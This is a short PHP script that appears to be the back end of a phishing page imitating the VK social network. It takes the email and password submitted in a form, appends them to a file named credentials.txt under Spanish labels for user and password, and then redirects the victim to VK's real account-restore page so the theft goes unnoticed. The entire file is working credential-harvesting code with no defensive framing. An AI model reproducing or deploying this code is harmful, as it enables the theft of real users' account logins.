<?php

file_put_contents("credentials.txt", "[+] Vk -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://vk.com/restore/');
exit();
?>
